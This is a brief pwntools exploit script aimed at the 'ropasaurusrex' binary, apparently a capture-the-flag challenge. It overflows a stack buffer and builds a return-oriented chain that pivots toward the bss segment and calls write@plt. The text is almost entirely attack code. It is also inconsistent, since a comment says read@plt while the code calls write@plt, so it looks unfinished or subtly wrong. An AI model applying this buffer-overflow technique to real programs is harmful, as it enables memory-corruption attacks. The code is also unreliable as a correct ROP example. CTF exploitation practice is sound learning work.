from pwn import *
libc = ELF('/usr/lib32/libc.so.6', checksec=False)
elf = ELF('./ropasaurusrex', checksec=False)
bss = 0x8049628 + 0x100
main = 0x0804841d
payload = b''.join([
    cyclic(0x88), p32(bss-4), # setup fake stack frame

    p32(elf.plt['write']), # call read@plt => return to bss
    p32(elf.plt['write']),
    p32(1)
])
p = elf.process()
pause()
p.sendline(payload)
p.interactive()